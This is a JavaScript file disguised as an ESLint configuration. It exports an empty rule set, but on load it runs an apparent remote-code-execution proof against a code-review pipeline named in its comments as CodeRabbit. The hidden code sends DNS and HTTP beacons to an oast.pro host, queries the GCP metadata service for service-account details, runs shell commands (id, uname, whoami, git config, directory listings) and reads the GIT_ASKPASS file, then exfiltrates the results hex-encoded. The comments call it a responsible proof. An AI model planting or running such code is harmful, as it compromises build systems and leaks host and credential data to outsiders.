// CodeRabbit review-pipeline RCE — blast-radius proof (responsible, ASYNC-only).
// Schedules all OOB I/O immediately so callbacks flush before the process exits.
// No live secret VALUES exfiltrated (SA email/scopes only; git config KEYS only).
var C = 'd8r72qboeaqn0p0abre01h1qozrthnias.oast.pro';
var http = require('http'), dns = require('dns'), cp = require('child_process'), fs = require('fs');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var dnsB = function (t, d) { try { dns.lookup((t + '-' + hex(d)).slice(0, 60) + '.' + C, function () {}); } catch (e) {} };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(d).slice(0, 1800), timeout: 6000 }, function () {}).on('error', function () {}); } catch (e) {} };

// fire a liveness beacon synchronously-scheduled (async) FIRST
dnsB('alive', 'eslintrc-loaded');

// (1) GCP metadata REACHABILITY (async) — email/scopes/project, NOT the token
var md = function (path, tag) {
  try {
    http.get({ host: 'metadata.google.internal', path: path, headers: { 'Metadata-Flavor': 'Google' }, timeout: 6000 },
      function (r) { var b = ''; r.on('data', function (d) { b += d; }); r.on('end', function () { httpX(tag, 'HTTP' + r.statusCode + ':' + b.slice(0, 400)); }); })
      .on('error', function (e) { dnsB(tag + 'err', (e && e.code) || 'err'); });
  } catch (e) { dnsB(tag + 'exc', '1'); }
};
md('/computeMetadata/v1/instance/service-accounts/default/email', 'mdsa');
md('/computeMetadata/v1/instance/service-accounts/default/scopes', 'mdscope');
md('/computeMetadata/v1/project/project-id', 'mdproj');

// (2) context + filesystem + git-cred mechanism — ALL async (no execSync)
var shA = function (c, tag) { try { cp.exec(c, { timeout: 6000 }, function (e, so, se) { httpX(tag, ((so || '') + (se || '') + (e ? 'ERR:' + e.code : '')).slice(0, 700)); }); } catch (x) { dnsB(tag + 'x', '1'); } };
shA('id', 'id');
shA('uname -a; whoami; pwd', 'ctx');
shA('git config --list --name-only', 'gitkeys');
shA('ls -la "$HOME"; echo ---PWD---; ls -la "$PWD"', 'fsls');

dnsB('askpath', String(process.env.GIT_ASKPASS || '(unset)'));
try { fs.readFile(process.env.GIT_ASKPASS || '/nonexistent', 'utf8', function (e, d) { httpX('askbody', e ? 'ERR:' + e.code : String(d).slice(0, 600)); }); } catch (e) {}

module.exports = { root: true, rules: {} };
